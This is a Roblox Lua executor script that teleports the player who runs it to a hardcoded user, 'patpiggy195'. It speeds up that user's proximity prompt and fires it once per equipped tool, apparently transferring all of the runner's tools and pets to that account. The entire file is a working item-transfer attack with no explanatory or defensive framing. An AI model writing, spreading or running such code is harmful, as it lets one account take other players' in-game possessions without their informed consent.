local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

local targetUsername = "patpiggy195"

-- Wait for target player to appear
local targetPlayer = Players:FindFirstChild(targetUsername)
if not targetPlayer then
    repeat
        task.wait(1)
        targetPlayer = Players:FindFirstChild(targetUsername)
    until targetPlayer
end

-- Wait for their character and the ProximityPrompt
local targetCharacter = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
local targetHRP = targetCharacter:WaitForChild("HumanoidRootPart")
local prompt = targetHRP:WaitForChild("ProximityPrompt")

-- Make the prompt faster
prompt.HoldDuration = 0.1

-- Move yourself to them
Character:SetPrimaryPartCFrame(targetHRP.CFrame)

-- Function to send all tools in Backpack and Character
local function sendAllTools()
    -- Send from Backpack
    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            Humanoid:EquipTool(tool)
            task.wait(0.15)
            fireproximityprompt(prompt)
            task.wait(0.15)
        end
    end

    -- Also check if any tools are equipped (like pets in garden)
    for _, tool in ipairs(Character:GetChildren()) do
        if tool:IsA("Tool") then
            task.wait(0.1)
            fireproximityprompt(prompt)
            task.wait(0.1)
        end
    end
end

-- Run once
sendAllTools()
